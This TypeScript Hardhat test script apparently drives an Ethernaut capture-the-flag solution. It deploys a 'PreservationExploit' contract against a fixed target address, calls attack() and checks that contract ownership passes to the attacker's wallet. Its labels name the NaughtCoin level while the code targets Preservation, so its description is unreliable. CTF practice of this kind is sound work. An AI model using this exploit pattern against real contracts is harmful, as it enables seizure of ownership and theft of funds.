import { ethers } from "hardhat";
import { utils } from "ethers";
import { expect } from "chai";

describe("NaughtCoin", function(){
    it("Aims to Solve the NaughtCoin Question of the Ethernaut CTF", async function() {
        this.timeout(0);

        // Initial Setup (Wallet etc..) 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0); // Check if the wallet amount is greater than 0 (If you have any money)

        // Define Target ABI
        const targetABI = [
        	"function setFirstTime(uint _timeStamp) public",
            "function owner() public view returns (address)",
        ]
        const targetAddr = "0x199dF2E466aF187E62878A876085078194d43eBC"; 

        // Connect to the Target Contract
        let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        let targetCont = contract.connect(eoa);

        // Define and Connect to the Malicious Contract
        const maliciousFactory = await ethers.getContractFactory("PreservationExploit");
        const maliciousContract = await maliciousFactory.deploy(targetAddr);

        // Wait for Malicious Contract to be Deployed
        await eoa.provider!.waitForTransaction(maliciousContract.deployTransaction.hash);

        // Display Owner
        let owner = await targetCont.owner();
        console.log(`Current Owner: ${owner}`);

        // Attack
        let transaction = await maliciousContract.attack();
        await transaction.wait();

        // Final Check
        const final_owner = await targetCont.owner();
        console.log(`Final Owner: ${final_owner}`);
        expect(final_owner).to.eq(eoa.address);

    });
}); 